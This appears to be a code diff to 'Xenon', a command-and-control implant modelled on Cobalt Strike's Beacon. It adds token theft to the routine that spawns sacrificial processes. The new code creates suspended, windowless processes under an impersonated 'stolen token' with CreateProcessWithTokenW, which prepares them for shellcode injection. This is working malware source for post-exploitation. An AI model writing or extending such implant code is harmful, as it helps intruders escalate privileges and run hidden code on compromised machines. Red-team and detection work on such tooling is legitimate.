@@ -14,6 +14,7 @@
 #include "Xenon.h"
 #include "Config.h"
 #include "Debug.h"
+#include "Identity.h"
 
 #if defined(INCLUDE_CMD_INJECT_SHELLCODE) || defined(INCLUDE_CMD_INLINE_EXECUTE)
 
@@ -407,6 +408,8 @@ void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
 BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo) {
     BOOL bSuccess = FALSE;
     CHAR lpPath   [MAX_PATH * 2];
+    WCHAR lpPathW [MAX_PATH * 2];
+    STARTUPINFOW siw = { 0 };
 	
     if (x86) {
         sprintf(lpPath, "C:\\Windows\\"X86PATH"\\%s", xenonConfig->spawnto);
@@ -415,18 +418,55 @@ BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo,
         sprintf(lpPath, "C:\\Windows\\"X64PATH"\\%s", xenonConfig->spawnto);
     }
 
-    bSuccess = CreateProcessA(
-        NULL, 
-        lpPath, 
-        NULL, 
-        NULL, 
-        TRUE, 
-        CREATE_SUSPENDED | CREATE_NO_WINDOW, 
-        NULL, 
-        NULL, 
-        sInfo, 
-        pInfo
-    );
+    /* Use stolen token if available and not explicitly ignored */
+    if ( !ignoreToken && gIdentityToken != NULL )
+    {
+        _dbg("\t Using impersonated token for process creation");
+        
+        /* Convert path to wide characters for CreateProcessWithTokenW */
+        if (MultiByteToWideChar(CP_ACP, 0, lpPath, -1, lpPathW, sizeof(lpPathW) / sizeof(WCHAR)) == 0)
+        {
+            DWORD error = GetLastError();
+            _err("\t Failed to convert path to wide char: %d", error);
+            return FALSE;
+        }
+        
+        /* Setup wide character startup info */
+        siw.cb = sizeof(STARTUPINFOW);
+        if (sInfo->dwFlags & STARTF_USESTDHANDLES)
+        {
+            siw.hStdOutput = sInfo->hStdOutput;
+            siw.hStdError = sInfo->hStdError;
+            siw.hStdInput = sInfo->hStdInput;
+            siw.dwFlags |= STARTF_USESTDHANDLES;
+        }
+        
+        bSuccess = CreateProcessWithTokenW(
+            gIdentityToken,   // Token handle
+            0,                // Logon flags
+            NULL,             // Application name
+            lpPathW,          // Command line (wide char)
+            CREATE_SUSPENDED | CREATE_NO_WINDOW, // Creation flags
+            NULL,             // Environment
+            NULL,             // Current directory
+            &siw,             // Startup info (wide char)
+            pInfo);           // Process information
+    }
+    else
+    {
+        bSuccess = CreateProcessA(
+            NULL, 
+            lpPath, 
+            NULL, 
+            NULL, 
+            TRUE, 
+            CREATE_SUSPENDED | CREATE_NO_WINDOW, 
+            NULL, 
+            NULL, 
+            sInfo, 
+            pInfo
+        );
+    }
 
     return bSuccess;
 }
